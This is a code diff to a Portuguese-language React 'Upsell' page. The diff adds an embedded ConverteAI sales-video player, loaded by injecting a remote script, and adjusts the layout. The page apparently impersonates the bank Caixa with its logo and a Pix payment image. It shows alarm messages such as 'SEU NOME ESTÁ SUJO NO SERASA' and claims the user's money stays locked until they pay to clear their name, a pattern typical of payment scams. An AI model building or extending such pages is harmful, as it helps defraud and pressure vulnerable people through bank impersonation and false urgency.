@@ -3,6 +3,7 @@ import logo from "../assets/caixalogo.png";
 import { HiChevronRight } from "react-icons/hi";
 import { IoIosWarning } from "react-icons/io";
 import pix from "../assets/pix.png"
+import { Helmet } from "react-helmet";
 
 export function Upsell() {
 
@@ -56,11 +57,11 @@ export function Upsell() {
             </header>
 
             {/* Container de Conteúdo */}
-            <div className="flex flex-col items-center w-full max-w-md bg-white shadow-lg rounded-lg p-6">
+            <div className="flex flex-col items-center w-full max-w-md bg-white shadow-lg rounded-lg p-4">
                 <div className="text-center">
                     {/* <img src={discountBadge} alt="90% Desconto" className="w-16 mx-auto" /> */}
 
-                    <div className="flex items-center justify-center pt-4 space-y-4">
+                    <div className="flex items-center justify-center space-y-4">
                         <IoIosWarning className="text-red-500 mr-2" size={36} />
                         <h2 className="text-3xl font-bold text-red-500">ATENÇÃO!</h2>
                     </div>
@@ -68,6 +69,13 @@ export function Upsell() {
                     <h2 className="text-3xl font-bold text-zinc-800 mt-4 mb-3">
                         SEU NOME ESTÁ SUJO NO SERASA
                     </h2>
+
+                    <div className="w-full  py-4">
+                        <div dangerouslySetInnerHTML={{ __html: '<div id="vid_672d05d660ed65000ad52cb8" style="position:relative;width:100%;padding: 56.25% 0 0;"> <img id="thumb_672d05d660ed65000ad52cb8" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/672d05d660ed65000ad52cb8/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_672d05d660ed65000ad52cb8" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>' }} />
+                        <Helmet>
+                            <script type="text/javascript" id="scr_672d05d660ed65000ad52cb8"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/672d05d660ed65000ad52cb8/player.js", s.async=!0,document.head.appendChild(s); </script>
+                        </Helmet>
+                    </div>
 
                     <h2 className="text-xl text-center text-red-600">O dinheiro permanecerá travado enquanto não regularizar seu nome no <span className="font-bold">SERASA</span> </h2>
 
